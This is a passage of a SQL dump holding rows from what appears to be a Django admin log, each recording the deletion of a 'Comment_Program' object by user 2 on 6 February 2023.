15:28:15.232068','7453','Comment_Program object (7453)',3,'',24,2),(2012,'2023-02-06 15:28:15.233251','5335','Comment_Program object (5335)',3,'',24,2),(2013,'2023-02-06 15:28:28.823905','8477','Comment_Program object (8477)',3,'',24,2),(2014,'2023-02-06 15:28:28.826766','11323','Comment_Program object (11323)',3,'',24,2),(2015,'2023-02-06 15:28:28.828719','2008','Comment_Program object (2008)',3,'',24,2),(2016,'2023-02-06 15:28:28.830193','13053','Comment_Program object (13053)',3,'',24,2),(2017,'2023-02-06 15:28:28.831510','15498','Comment_Program object (15498)',3,'',24,2),(2018,'2023-02-06 15:28:28.833206','8326','Comment_Program object (8326)',3,'',24,2),(2019,'2023-02-06 15:28:28.834366','3108','Comment_Program object (3108)',3,'',24,2),(2020,'2023-02-06 15:28:28.835596','14376','Comment_Program object (14376)',3,'',24,2),(2021,'2023-02-06 15:28:28.836925','9128','Comment_Program object (9128)',3,'',24,2),(2022,'2023-02-06 15:28:28.838159','2676','Comment_Program object (2676)',3,'',24,2),(2023,'2023-02-06 15:28:28.839935','1972','Comment_Program object (1972)',3,'',24,2),(2024,'2023-02-06 15:28:28.841229','14499','Comment_Program object (14499)',3,'',24,2),(2025,'2023-02-06 15:28:28.842492','14720','Comment_Program object (14720)',3,'',24,2),(2026,'2023-02-06 15:28:28.843746','7116','Comment_Program object (7116)',3,'',24,2),(2027,'2023-02-06 15:28:28.845071','6891','Comment_Program object (6891)',3,'',24,2),(2028,'2023-02-06 15:28:28.846239','15646','Comment_Program object (15646)',3,'',24,2),(2029,'2023-02-06 15:28:28.847394','8332','Comment_Program object (8332)',3,'',24,2),(2030,'2023-02-06 15:28:28.848620','5516','Comment_Program object (5516)',3,'',24,2),(2031,'2023-02-06 15:28:28.849898','5284','Comment_Program object (5284)',3,'',24,2),(2032,'2023-02-06 15:28:28.851717','3983','Comment_Program object (3983)',3,'',24,2),(2033,'2023-02-06 15:28:28.853063','16116','Comment_Program object (16116)',3,'',24,2),(2034,'2023-02-06 15:28:28.854361','4600','Comment_Program object (4600)',3,'',24,2),(2035,'2023-02-06 15:28:28.855569','4333','Comment_Program object (4333)',3,'',24,2),(2036,'2023-02-06 15:28:28.856770','211','Comment_Program object (211)',3,'',24,2),(2037,'2023-02-06 15:28:28.858006','6791','Comment_Program object (6791)',3,'',24,2),(2038,'2023-02-06 15:28:28.859239','4299','Comment_Program object (4299)',3,'',24,2),(2039,'2023-02-06 15:28:28.860434','11630','Comment_Program object (11630)',3,'',24,2),(2040,'2023-02-06 15:28:28.861557','9053','Comment_Program object (9053)',3,'',24,2),(2041,'2023-02-06 15:28:28.863441','441','Comment_Program object (441)',3,'',24,2),(2042,'2023-02-06 15:28:28.865094','4867','Comment_Program object (4867)',3,'',24,2),(2043,'2023-02-06 15:28:28.866590','8946','Comment_Program object (8946)',3,'',24,2),(2044,'2023-02-06 15:28:28.867813','6664','Comment_Program object (6664)',3,'',24,2),(2045,'2023-02-06 15:28:28.869082','16544','Comment_Program object (16544)',3,'',24,2),(2046,'2023-02-06 15:28:28.870284','9608','Comment_Program object (9608)',3,'',24,2),(2047,'2023-02-06 15:28:28.871410','13975','Comment_Program object (13975)',3,'',24,2),(2048,'2023-02-06 15:28:28.873116','6046','Comment_Program object (6046)',3,'',24,2),(2049,'2023-02-06 15:28:28.874410','15007','Comment_Program object (15007)',3,'',24,2),(2050,'2023-02-06 15:28:28.880145','4783','Comment_Program object (4783)',3,'',24,2),(2051,'2023-02-06 15:28:28.881686','15792','Comment_Program object (15792)',3,'',24,2),(2052,'2023-02-06 15:28:28.882994','6348','Comment_Program object (6348)',3,'',24,2),(2053,'2023-02-06 15:28:28.884311','5911','Comment_Program object (5911)',3,'',24,2),(2054,'2023-02-06 15:28:28.885818','604','Comment_Program object (604)',3,'',24,2),(2055,'2023-02-06 15:28:28.887076','11424','Comment_Program object (11424)',3,'',24,2),(2056,'2023-02-06 15:28:28.888358','13430','Comment_Program object (13430)',3,'',24,2),(2057,'2023-02-06 15:28:28.889927','14492','Comment_Program object (14492)',3,'',24,2),(2058,'2023-02-06 15:28:28.891316','13931','Comment_Program object (13931)',3,'',24,2),(2059,'2023-02-06 15:28:28.893296','3469','Comment_Program object (3469)',3,'',24,2),(2060,'2023-02-06 15:28:28.894596','15216','Comment_Program object (15216)',3,'',24,2),(2061,'2023-02-06 15:28:28.895905','13543','Comment_Program object (13543)',3,'',24,2),(2062,'2023-02-06 15:28:28.899484','7355','Comment_Program object (7355)',3,'',24,2),(2063,'2023-02-06 15:28:28.901006','7349','Comment_Program object (7349)',3,'',24,2),(2064,'2023-02-06 15:28:28.902460','14667','Comment_Program object (14667)',3,'',24,2),(2065,'2023-02-06 15:28:28.903891','4484','Comment_Program object (4484)',3,'',24,2),(2066,'2023-02-06 15:28:28.905187','12269','Comment_Program object (12269)',3,'',24,2),(2067,'2023-02-06 15:28:28.907091','4328','Comment_Program object (4328)',3,'',24,2),(2068,'2023-02-06 15:28:28.908627','3887','Comment_Program object (3887)',3,'',24,2),(2069,'2023-02-06 15:28:28.909853','5490','Comment_Program object (5490)',3,'',24,2),(2070,'2023-02-06 15:28:28.911281','8551','Comment_Program object (8551)',3,'',24,2),(2071,'2023-02-06 15:28:28.912687','7222','Comment_Program object (7222)',3,'',24,2),(2072,'2023-02-06 15:28:28.914145','12566','Comment_Program object (12566)',3,'',24,2),(2073,'2023-02-06 15:28:28.915305','15283','Comment_Program object (15283)',3,'',24,2),(2074,'2023-02-06 15:28:28.916574','7127','Comment_Program object (7127)',3,'',24,2),(2075,'2023-02-06 15:28:28.917854','8055','Comment_Program object (8055)',3,'',24,2),(2076,'2023-02-06 15:28:28.919772','3621','Comment_Program object (3621)',3,'',24,2),(2077,'2023-02-06 15:28:28.921062','1923','Comment_Program object (1923)',3,'',24,2),(2078,'2023-02-06 15:28:28.922544','14613','Comment_Program object (14613)',3,'',24,2),(2079,'2023-02-06 15:28:28.923910','11917','Comment_Program object (11917)',3,'',24,2),(2080,'2023-02-06 15:28:28.925217','7593','Comment_Program object (7593)',3,'',24,2),(2081,'2023-02-06 15:28:28.926623','9669','Comment_Program object (9669)',3,'',24,2),(2082,'2023-02-06 15:28:28.927816','7895','Comment_Program object (7895)',3,'',24,2),(2083,'2023-02-06 15:28:28.929223','16138','Comment_Program object (16138)',3,'',24,2),(2084,'2023-02-06 15:28:28.930635','9547','Comment_Program object (9547)',3,'',24,2),(2085,'2023-02-06 15:28:28.932399','4348','Comment_Program object (4348)',3,'',24,2),(2086,'2023-02-06 15:28:28.933752','1211','Comment_Program object (1211)',3,'',24,2),(2087,'2023-02-06 15:28:28.935045','3541','Comment_Program object (3541)',3,'',24,2),(2088,'2023-02-06 15:28:28.936349','1665','Comment_Program object (1665)',3,'',24,2),(2089,'2023-02-06 15:28:28.937711','8405','Comment_Program object (8405)',3,'',24,2),(2090,'2023-02-06 15:28:28.939018','2144','Comment_Program object (2144)',3,'',24,2),(2091,'2023-02-06 15:28:28.940314','16622','Comment_Program object (16622)',3,'',24,2),(2092,'2023-02-06 15:28:28.941916','7888','Comment_Program object (7888)',3,'',24,2),(2093,'2023-02-06 15:28:28.943207','5867','Comment_Program object (5867)',3,'',24,2),(2094,'2023-02-06 15:28:28.945096','11537','Comment_Program object (11537)',3,'',24,2),(2095,'2023-02-06 15:28:28.946603','8292','Comment_Program object (8292)',3,'',24,2),(2096,'2023-02-06 15:28:28.947986','13861','Comment_Program object (13861)',3,'',24,2),(2097,'2023-02-06 15:28:28.949566','9345','Comment_Program object (9345)',3,'',24,2),(2098,'2023-02-06 15:28:28.950937','4679','Comment_Program object (4679)',3,'',24,2),(2099,'2023-02-06 15:28:28.952445','15177','Comment_Program object (15177)',3,'',24,2),(2100,'2023-02-06 15:28:28.953791','8201','Comment_Program object (8201)',3,'',24,2),(2101,'2023-02-06 15:28:28.955090','4799','Comment_Program object (4799)',3,'',24,2),(2102,'2023-02-06 15:28:28.956428','10446','Comment_Program object (10446)',3,'',24,2),(2103,'2023-02-06 15:28:28.958442','13936','Comment_Program object (13936)',3,'',24,2),(2104,'2023-02-06 15:28:28.959764','10467','Comment_Program object (10467)',3,'',24,2),(2105,'2023-02-06 15:28:28.961010','11745','Comment_Program object (11745)',3,'',24,2),(2106,'2023-02-06 15:28:28.962202','7140','Comment_Program object (7140)',3,'',24,2),(2107,'2023-02-06 15:28:28.964278','13624','Comment_Program object (13624)',3,'',24,2),(2108,'2023-02-06 15:28:28.965819','12604','Comment_Program object (12604)',3,'',24,2),(2109,'2023-02-06 15:28:28.967311','6273','Comment_Program object (6273)',3,'',24,2),(2110,'2023-02-06 15:28:28.968653','5795','Comment_Program object (5795)',3,'',24,2),(2111,'2023-02-06 15:28:28.969975','13540','Comment_Program object (13540)',3,'',24,2),(2112,'2023-02-06 15:28:28.971859','10290','Comment_Program object (10290)',3,'',24,2),(2113,'2023-02-06 15:28:38.863165','10221','Comment_Program object (10221)',3,'',24,2),(2114,'2023-02-06 15:28:38.866063','14132','Comment_Program object (14132)',3,'',24,2),(2115,'2023-02-06 15:28:38.867925','10309','Comment_Program object (10309)',3,'',24,2),(2116,'2023-02-06 15:28:38.869441','2385','Comment_Program object (2385)',3,'',24,2),(2117,'2023-02-06 15:28:38.870843','7397','Comment_Program object (7397)',3,'',24,2),(2118,'2023-02-06 15:28:38.872137','1088','Comment_Program object (1088)',3,'',24,2),(2119,'2023-02-06 15:28:38.873374','16658','Comment_Program object (16658)',3,'',24,2),(2120,'2023-02-06 15:28:38.876592','16062','Comment_Program object (16062)',3,'',24,2),(2121,'2023-02-06 15:28:38.878038','15614','Comment_Program object (15614)',3,'',24,2),(2122,'2023-02-06 15:28:38.879441','15031','Comment_Program object (15031)',3,'',24,2),(2123,'2023-02-06 15:28:38.880878','12930','Comment_Program object (12930)',3,'',24,2),(2124,'2023-02-06 15:28:38.882154','5561','Comment_Program object (5561)',3,'',24,2),(2125,'2023-02-06 15:28:38.883503','12717','Comment_Program object (12717)',3,'',24,2),(2126,'2023-02-06 15:28:38.884838','14931','Comment_Program object (14931)',3,'',24,2),(2127,'2023-02-06 15:28:38.886145','15301','Comment_Program object (15301)',3,'',24,2),(2128,'2023-02-06 15:28:38.887421','5661','Comment_Program object (5661)',3,'',24,2),(2129,'2023-02-06 15:28:38.889728','4754','Comment_Program object (4754)',3,'',24,2),(2130,'2023-02-06 15:28:38.891163','145','Comment_Program object (145)',3,'',24,2),(2131,'2023-02-06 15:28:38.892471','12037','Comment_Program object (12037)',3,'',24,2),(2132,'2023-02-06 15:28:38.893796','3139','Comment_Program object (3139)',3,'',24,2),(2133,'2023-02-06 15:28:38.894990','16413','Comment_Program object (16413)',3,'',24,2),(2134,'2023-02-06 15:28:38.896185','15427','Comment_Program object (15427)',3,'',24,2),(2135,'2023-02-06 15:28:38.897554','11739','Comment_Program object (11739)',3,'',24,2),(2136,'2023-02-06 15:28:38.898813','7079','Comment_Program object (7079)',3,'',24,2),(2137,'2023-02-06 15:28:38.900035','1065','Comment_Program object (1065)',3,'',24,2),(2138,'2023-02-06 15:28:38.902173','2957','Comment_Program object (2957)',3,'',24,2),(2139,'2023-02-06 15:28:38.903520','13031','Comment_Program object (13031)',3,'',24,2),(2140,'2023-02-06 15:28:38.904804','10267','Comment_Program object (10267)',3,'',24,2),(2141,'2023-02-06 15:28:38.906079','11702','Comment_Program object (11702)',3,'',24,2),(2142,'2023-02-06 15:28:38.907336','10533','Comment_Program object (10533)',3,'',24,2),(2143,'2023-02-06 15:28:38.908556','14997','Comment_Program object (14997)',3,'',24,2),(2144,'2023-02-06 15:28:38.909801','1736','Comment_Program object (1736)',3,'',24,2),(2145,'2023-02-06 15:28:38.911080','4911','Comment_Program object (4911)',3,'',24,2),(2146,'2023-02-06 15:28:38.912233','174','Comment_Program object (174)',3,'',24,2),(2147,'2023-02-06 15:28:38.914309','10552','Comment_Program object (10552)',3,'',24,2),(2148,'2023-02-06 15:28:38.915514','2593','Comment_Program object (2593)',3,'',24,2),(2149,'2023-02-06 15:28:38.916825','11812','Comment_Program object (11812)',3,'',24,2),(2150,'2023-02-06 15:28:38.917957','9764','Comment_Program object (9764)',3,'',24,2),(2151,'2023-02-06 15:28:38.919065','10263','Comment_Program object (10263)',3,'',24,2),(2152,'2023-02-06 15:28:38.920215','7036','Comment_Program object (7036)',3,'',24,2),(2153,'2023-02-06 15:28:38.921469','6499','Comment_Program object (6499)',3,'',24,2),(2154,'2023-02-06 15:28:38.922591','1726','Comment_Program object (1726)',3,'',24,2),(2155,'2023-02-06 15:28:38.923774','10803','Comment_Program object (10803)',3,'',24,2),(2156,'2023-02-06 15:28:38.925915','12294','Comment_Program object (12294)',3,'',24,2),(2157,'2023-02-06 15:28:38.927305','10409','Comment_Program object (10409)',3,'',24,2),(2158,'2023-02-06 15:28:38.928619','15222','Comment_Program object (15222)',3,'',24,2),(2159,'2023-02-06 15:28:38.930003','12137','Comment_Program object (12137)',3,'',24,2),(2160,'2023-02-06 15:28:38.931414','11368','Comment_Program object (11368)',3,'',24,2),(2161,'2023-02-06 15:28:38.932573','5414','Comment_Program object (5414)',3,'',24,2),(2162,'2023-02-06 15:28:38.933628','1681','Comment_Program object (1681)',3,'',24,2),(2163,'2023-02-06 15:28:38.934727','4338','Comment_Program object (4338)',3,'',24,2),(2164,'2023-02-06 15:28:38.936073','12515','Comment_Program object (12515)',3,'',24,2),(2165,'2023-02-06 15:28:38.938287','16651','Comment_Program object (16651)',3,'',24,2),(2166,'2023-02-06 15:28:38.939457','981','Comment_Program object (981)',3,'',24,2),(2167,'2023-02-06 15:28:38.940782','3772','Comment_Program object (3772)',3,'',24,2),(2168,'2023-02-06 15:28:38.941947','15164','Comment_Program object (15164)',3,'',24,2),(2169,'2023-02-06 15:28:38.943087','5667','Comment_Program object (5667)',3,'',24,2),(2170,'2023-02-06 15:28:38.944363','3650','Comment_Program object (3650)',3,'',24,2),(2171,'2023-02-06 15:28:38.945549','9757','Comment_Program object (9757)',3,'',24,2),(2172,'2023-02-06 15:28:38.946527','7942','Comment_Program object (7942)',3,'',24,2),(2173,'2023-02-06 15:28:38.947492','722','Comment_Program object (722)',3,'',24,2),(2174,'2023-02-06 15:28:38.949302','14046','Comment_Program object (14046)',3,'',24,2),(2175,'2023-02-06 15:28:38.950418','15866','Comment_Program object (15866)',3,'',24,2),(2176,'2023-02-06 15:28:38.951480','2962','Comment_Program object (2962)',3,'',24,2),(2177,'2023-02-06 15:28:38.952515','15276','Comment_Program object (15276)',3,'',24,2),(2178,'2023-02-06 15:28:38.953577','14137','Comment_Program object (14137)',3,'',24,2),(2179,'2023-02-06 15:28:38.954804','8233','Comment_Program object (8233)',3,'',24,2),(2180,'2023-02-06 15:28:38.956036','3960','Comment_Program object (3960)',3,'',24,2),(2181,'2023-02-06 15:28:38.957330','6900','Comment_Program object (6900)',3,'',24,2),(2182,'2023-02-06 15:28:38.958608','11443','Comment_Program object (11443)',3,'',24,2),(2183,'2023-02-06 15:28:38.960755','13040','Comment_Program object (13040)',3,'',24,2),(2184,'2023-02-06 15:28:38.962003','12495','Comment_Program object (12495)',3,'',24,2),(2185,'2023-02-06 15:28:38.963151','9170','Comment_Program object (9170)',3,'',24,2),(2186,'2023-02-06 15:28:38.964721','9094','Comment_Program object (9094)',3,'',24,2),(2187,'2023-02-06 15:28:38.966426','2951','Comment_Program object (2951)',3,'',24,2),(2188,'2023-02-06 15:28:38.967726','12499','Comment_Program object (12499)',3,'',24,2),(2189,'2023-02-06 15:28:38.968961','7003','Comment_Program object (7003)',3,'',24,2),(2190,'2023-02-06 15:28:38.970243','14904','Comment_Program object (14904)',3,'',24,2),(2191,'2023-02-06 15:28:38.971405','12077','Comment_Program object (12077)',3,'',24,2),(2192,'2023-02-06 15:28:38.973376','16158','Comment_Program object (16158)',3,'',24,2),(2193,'2023-02-06 15:28:38.974468','13994','Comment_Program object (13994)',3,'',24,2),(2194,'2023-02-06 15:28:38.975594','13298','Comment_Program object (13298)',3,'',24,2),(2195,'2023-02-06 15:28:38.976874','11187','Comment_Program object (11187)',3,'',24,2),(2196,'2023-02-06 15:28:38.978127','1712','Comment_Program object (1712)',3,'',24,2),(2197,'2023-02-06 15:28:38.979388','16063','Comment_Program object (16063)',3,'',24,2),(2198,'2023-02-06 15:28:38.980617','9017','Comment_Program object (9017)',3,'',24,2),(2199,'2023-02-06 15:28:38.981874','1119','Comment_Program object (1119)',3,'',24,2),(2200,'2023-02-06 15:28:38.983913','1716','Comment_Program object (1716)',3,'',24,2),(2201,'2023-02-06 15:28:38.985195','11122','Comment_Program object (11122)',3,'',24,2),(2202,'2023-02-06 15:28:38.986553','10713','Comment_Program object (10713)',3,'',24,2),(2203,'2023-02-06 15:28:38.987861','11561','Comment_Program object (11561)',3,'',24,2),(2204,'2023-02-06 15:28:38.989161','9439','Comment_Program object (9439)',3,'',24,2),(2205,'2023-02-06 15:28:38.990399','11824','Comment_Program object (11824)',3,'',24,2),(2206,'2023-02-06 15:28:38.991692','10778','Comment_Program object (10778)',3,'',24,2),(2207,'2023-02-06 15:28:38.993036','10675','Comment_Program object (10675)',3,'',24,2),(2208,'2023-02-06 15:28:38.994150','1993','Comment_Program object (1993)',3,'',24,2),(2209,'2023-02-06 15:28:38.996239','818','Comment_Program object (818)',3,'',24,2),(2210,'2023-02-06 15:28:38.997631','8355','Comment_Program object (8355)',3,'',24,2),(2211,'2023-02-06 15:28:38.998904','14294','Comment_Program object (14294)',3,'',24,2),(2212,'2023-02-06 15:28:39.000253','1661','Comment_Program object (1661)',3,'',24,2),(2213,'2023-02-06 15:28:52.690874','11832','Comment_Program object (11832)',3,'',24,2),(2214,'2023-02-06 15:28:52.693540','11768','Comment_Program object (11768)',3,'',24,2),(2215,'2023-02-06 15:28:52.695367','2017','Comment_Program object (2017)',3,'',24,2),(2216,'2023-02-06 15:28:52.697172','13192','Comment_Program object (13192)',3,'',24,2),(2217,'2023-02-06 15:28:52.701005','2203','Comment_Program object (2203)',3,'',24,2),(2218,'2023-02-06 15:28:52.702927','6451','Comment_Program object (6451)',3,'',24,2),(2219,'2023-02-06 15:28:52.704595','6125','Comment_Program object (6125)',3,'',24,2),(2220,'2023-02-06 15:28:52.706155','9195','Comment_Program object (9195)',3,'',24,2),(2221,'2023-02-06 15:28:52.707821','14746','Comment_Program object (14746)',3,'',24,2),(2222,'2023-02-06 15:28:52.709637','6232','Comment_Program object (6232)',3,'',24,2),(2223,'2023-02-06 15:28:52.711499','10059','Comment_Program object (10059)',3,'',24,2),(2224,'2023-02-06 15:28:52.713208','3571','Comment_Program object (3571)',3,'',24,2),(2225,'2023-02-06 15:28:52.715002','4429','Comment_Program object (4429)',3,'',24,2),(2226,'2023-02-06 15:28:52.717733','15407','Comment_Program object (15407)',3,'',24,2),(2227,'2023-02-06 15:28:52.719371','9517','Comment_Program object (9517)',3,'',24,2),(2228,'2023-02-06 15:28:52.720900','15157','Comment_Program object (15157)',3,'',24,2),(2229,'2023-02-06 15:28:52.722389','7190','Comment_Program object (7190)',3,'',24,2),(2230,'2023-02-06 15:28:52.723937','11310','Comment_Program object (11310)',3,'',24,2),(2231,'2023-02-06 15:28:52.725421','6852','Comment_Program object (6852)',3,'',24,2),(2232,'2023-02-06 15:28:52.726888','4707','Comment_Program object (4707)',3,'',24,2),(2233,'2023-02-06 15:28:52.728286','5786','Comment_Program object (5786)',3,'',24,2),(2234,'2023-02-06 15:28:52.729709','16045','Comment_Program object (16045)',3,'',24,2),(2235,'2023-02-06 15:28:52.732138','12826','Comment_Program object (12826)',3,'',24,2),(2236,'2023-02-06 15:28:52.733527','5841','Comment_Program object (5841)',3,'',24,2),(2237,'2023-02-06 15:28:52.734983','2866','Comment_Program object (2866)',3,'',24,2),(2238,'2023-02-06 15:28:52.736285','7561','Comment_Program object (7561)',3,'',24,2),(2239,'2023-02-06 15:28:52.737611','6493','Comment_Program object (6493)',3,'',24,2),(2240,'2023-02-06 15:28:52.738942','6338','Comment_Program object (6338)',3,'',24,2),(2241,'2023-02-06 15:28:52.740518','2861','Comment_Program object (2861)',3,'',24,2),(2242,'2023-02-06 15:28:52.743427','13876','Comment_Program object (13876)',3,'',24,2),(2243,'2023-02-06 15:28:52.745173','12744','Comment_Program object (12744)',3,'',24,2),(2244,'2023-02-06 15:28:52.747933','8625','Comment_Program object (8625)',3,'',24,2),(2245,'2023-02-06 15:28:52.749532','9417','Comment_Program object (9417)',3,'',24,2),(2246,'2023-02-06 15:28:52.750859','13690','Comment_Program object (13690)',3,'',24,2),(2247,'2023-02-06 15:28:52.752218','4019','Comment_Program object (4019)',3,'',24,2),(2248,'2023-02-06 15:28:52.753649','10851','Comment_Program object (10851)',3,'',24,2),(2249,'2023-02-06 15:28:52.754876','11317','Comment_Program object (11317)',3,'',24,2),(2250,'2023-02-06 15:28:52.756079','1014','Comment_Program object (1014)',3,'',24,2),(2251,'2023-02-06 15:28:52.757305','2785','Comment_Program object (2785)',3,'',24,2),(2252,'2023-02-06 15:28:52.758547','3024','Comment_Program object (3024)',3,'',24,2),(2253,'2023-02-06 15:28:52.760636','14953','Comment_Program object (14953)',3,'',24,2),(2254,'2023-02-06 15:28:52.762012','1006','Comment_Program object (1006)',3,'',24,2),(2255,'2023-02-06 15:28:52.763547','4962','Comment_Program object (4962)',3,'',24,2),(2256,'2023-02-06 15:28:52.764712','13798','Comment_Program object (13798)',3,'',24,2),(2257,'2023-02-06 15:28:52.765966','13974','Comment_Program object (13974)',3,'',24,2),(2258,'2023-02-06 15:28:52.767169','12822','Comment_Program object (12822)',3,'',24,2),(2259,'2023-02-06 15:28:52.768243','16534','Comment_Program object (16534)',3,'',24,2),(2260,'2023-02-06 15:28:52.769427','14943','Comment_Program object (14943)',3,'',24,2),(2261,'2023-02-06 15:28:52.770568','13293','Comment_Program object (13293)',3,'',24,2),(2262,'2023-02-06 15:28:52.772340','3582','Comment_Program object (3582)',3,'',24,2),(2263,'2023-02-06 15:28:52.773603','4559','Comment_Program object (4559)',3,'',24,2),(2264,'2023-02-06 15:28:52.774733','4543','Comment_Program object (4543)',3,'',24,2),(2265,'2023-02-06 15:28:52.775783','12691','Comment_Program object (12691)',3,'',24,2),(2266,'2023-02-06 15:28:52.776906','3840','Comment_Program object (3840)',3,'',24,2),(2267,'2023-02-06 15:28:52.778002','10286','Comment_Program object (10286)',3,'',24,2),(2268,'2023-02-06 15:28:52.778992','7111','Comment_Program object (7111)',3,'',24,2),(2269,'2023-02-06 15:28:52.779990','12997','Comment_Program object (12997)',3,'',24,2),(2270,'2023-02-06 15:28:52.780973','15951','Comment_Program object (15951)',3,'',24,2),(2271,'2023-02-06 15:28:52.782529','13041','Comment_Program object (13041)',3,'',24,2),(2272,'2023-02-06 15:28:52.783700','16509','Comment_Program object (16509)',3,'',24,2),(2273,'2023-02-06 15:28:52.784858','15557','Comment_Program object (15557)',3,'',24,2),(2274,'2023-02-06 15:28:52.785877','12467','Comment_Program object (12467)',3,'',24,2),(2275,'2023-02-06 15:28:52.786825','1722','Comment_Program object (1722)',3,'',24,2),(2276,'2023-02-06 15:28:52.787813','6289','Comment_Program object (6289)',3,'',24,2),(2277,'2023-02-06 15:28:52.788939','11304','Comment_Program object (11304)',3,'',24,2),(2278,'2023-02-06 15:28:52.790579','369','Comment_Program object (369)',3,'',24,2),(2279,'2023-02-06 15:28:52.792014','14687','Comment_Program object (14687)',3,'',24,2),(2280,'2023-02-06 15:28:52.794069','7526','Comment_Program object (7526)',3,'',24,2),(2281,'2023-02-06 15:28:52.795160','10537','Comment_Program object (10537)',3,'',24,2),(2282,'2023-02-06 15:28:52.796084','6948','Comment_Program object (6948)',3,'',24,2),(2283,'2023-02-06 15:28:52.797117','2622','Comment_Program object (2622)',3,'',24,2),(2284,'2023-02-06 15:28:52.798269','8953','Comment_Program object (8953)',3,'',24,2),(2285,'2023-02-06 15:28:52.799549','11503','Comment_Program object (11503)',3,'',24,2),(2286,'2023-02-06 15:28:52.800758','15017','Comment_Program object (15017)',3,'',24,2),(2287,'2023-02-06 15:28:52.801840','14290','Comment_Program object (14290)',3,'',24,2),(2288,'2023-02-06 15:28:52.802839','4862','Comment_Program object (4862)',3,'',24,2),(2289,'2023-02-06 15:28:52.804415','4812','Comment_Program object (4812)',3,'',24,2),(2290,'2023-02-06 15:28:52.805468','2420','Comment_Program object (2420)',3,'',24,2),(2291,'2023-02-06 15:28:52.806470','13909','Comment_Program object (13909)',3,'',24,2),(2292,'2023-02-06 15:28:52.807463','5920','Comment_Program object (5920)',3,'',24,2),(2293,'2023-02-06 15:28:52.808504','1940','Comment_Program object (1940)',3,'',24,2),(2294,'2023-02-06 15:28:52.809549','2067','Comment_Program object (2067)',3,'',24,2),(2295,'2023-02-06 15:28:52.810611','116','Comment_Program object (116)',3,'',24,2),(2296,'2023-02-06 15:28:52.811740','11933','Comment_Program object (11933)',3,'',24,2),(2297,'2023-02-06 15:28:52.812874','8403','Comment_Program object (8403)',3,'',24,2),(2298,'2023-02-06 15:28:52.814625','6725','Comment_Program object (6725)',3,'',24,2),(2299,'2023-02-06 15:28:52.815711','2898','Comment_Program object (2898)',3,'',24,2),(2300,'2023-02-06 15:28:52.816832','7201','Comment_Program object (7201)',3,'',24,2),(2301,'2023-02-06 15:28:52.817819','749','Comment_Program object (749)',3,'',24,2),(2302,'2023-02-06 15:28:52.818791','6987','Comment_Program object (6987)',3,'',24,2),(2303,'2023-02-06 15:28:52.819857','9646','Comment_Program object (9646)',3,'',24,2),(2304,'2023-02-06 15:28:52.820988','8505','Comment_Program object (8505)',3,'',24,2),(2305,'2023-02-06 15:28:52.822005','3034','Comment_Program object (3034)',3,'',24,2),(2306,'2023-02-06 15:28:52.822940','2704','Comment_Program object (2704)',3,'',24,2),(2307,'2023-02-06 15:28:52.824550','9820','Comment_Program object (9820)',3,'',24,2),(2308,'2023-02-06 15:28:52.825625','8906','Comment_Program object (8906)',3,'',24,2),(2309,'2023-02-06 15:28:52.826637','5557','Comment_Program object (5557)',3,'',24,2),(2310,'2023-02-06 15:28:52.827600','16313','Comment_Program object (16313)',3,'',24,2),(2311,'2023-02-06 15:28:52.828587','5247','Comment_Program object (5247)',3,'',24,2),(2312,'2023-02-06 15:28:52.829781','4847','Comment_Program object (4847)',3,'',24,2),(2313,'2023-02-06 15:29:03.187339','6344','Comment_Program object (6344)',3,'',24,2),(2314,'2023-02-06 15:29:03.190024','514','Comment_Program object (514)',3,'',24,2),(2315,'2023-02-06 15:29:03.191379','13719','Comment_Program object (13719)',3,'',24,2),(2316,'2023-02-06 15:29:03.192641','3614','Comment_Program object (3614)',3,'',24,2),(2317,'2023-02-06 15:29:03.193756','16054','Comment_Program object (16054)',3,'',24,2),(2318,'2023-02-06 15:29:03.194767','8823','Comment_Program object (8823)',3,'',24,2),(2319,'2023-02-06 15:29:03.195726','9273','Comment_Program object (9273)',3,'',24,2),(2320,'2023-02-06 15:29:03.196715','5779','Comment_Program object (5779)',3,'',24,2),(2321,'2023-02-06 15:29:03.197708','6258','Comment_Program object (6258)',3,'',24,2),(2322,'2023-02-06 15:29:03.198667','12015','Comment_Program object (12015)',3,'',24,2),(2323,'2023-02-06 15:29:03.200251','776','Comment_Program object (776)',3,'',24,2),(2324,'2023-02-06 15:29:03.201395','9539','Comment_Program object (9539)',3,'',24,2),(2325,'2023-02-06 15:29:03.202458','6510','Comment_Program object (6510)',3,'',24,2),(2326,'2023-02-06 15:29:03.203397','6269','Comment_Program object (6269)',3,'',24,2),(2327,'2023-02-06 15:29:03.204578','13814','Comment_Program object (13814)',3,'',24,2),(2328,'2023-02-06 15:29:03.205680','10692','Comment_Program object (10692)',3,'',24,2),(2329,'2023-02-06 15:29:03.206667','3978','Comment_Program object (3978)',3,'',24,2),(2330,'2023-02-06 15:29:03.207616','2886','Comment_Program object (2886)',3,'',24,2),(2331,'2023-02-06 15:29:03.208643','861','Comment_Program object (861)',3,'',24,2),(2332,'2023-02-06 15:29:03.210221','13857','Comment_Program object (13857)',3,'',24,2),(2333,'2023-02-06 15:29:03.211253','11746','Comment_Program object (11746)',3,'',24,2),(2334,'2023-02-06 15:29:03.212260','8437','Comment_Program object (8437)',3,'',24,2),(2335,'2023-02-06 15:29:03.213408','13403','Comment_Program object (13403)',3,'',24,2),(2336,'2023-02-06 15:29:03.214506','8700','Comment_Program object (8700)',3,'',24,2),(2337,'2023-02-06 15:29:03.215480','4297','Comment_Program object (4297)',3,'',24,2),(2338,'2023-02-06 15:29:03.216505','12710','Comment_Program object (12710)',3,'',24,2),(2339,'2023-02-06 15:29:03.217496','9183','Comment_Program object (9183)',3,'',24,2),(2340,'2023-02-06 15:29:03.218581','948','Comment_Program object (948)',3,'',24,2),(2341,'2023-02-06 15:29:03.220079','1099','Comment_Program object (1099)',3,'',24,2),(2342,'2023-02-06 15:29:03.221166','10073','Comment_Program object (10073)',3,'',24,2),(2343,'2023-02-06 15:29:03.222216','13701','Comment_Program object (13701)',3,'',24,2),(2344,'2023-02-06 15:29:03.223300','5347','Comment_Program object (5347)',3,'',24,2),(2345,'2023-02-06 15:29:03.224368','16237','Comment_Program object (16237)',3,'',24,2),(2346,'2023-02-06 15:29:03.225352','15437','Comment_Program object (15437)',3,'',24,2),(2347,'2023-02-06 15:29:03.226289','2660','Comment_Program object (2660)',3,'',24,2),(2348,'2023-02-06 15:29:03.227303','10622','Comment_Program object (10622)',3,'',24,2),(2349,'2023-02-06 15:29:03.228211','8667','Comment_Program object (8667)',3,'',24,2),(2350,'2023-02-06 15:29:03.229762','12374','Comment_Program object (12374)',3,'',24,2),(2351,'2023-02-06 15:29:03.230722','79','Comment_Program object (79)',3,'',24,2),(2352,'2023-02-06 15:29:03.231632','5238','Comment_Program object 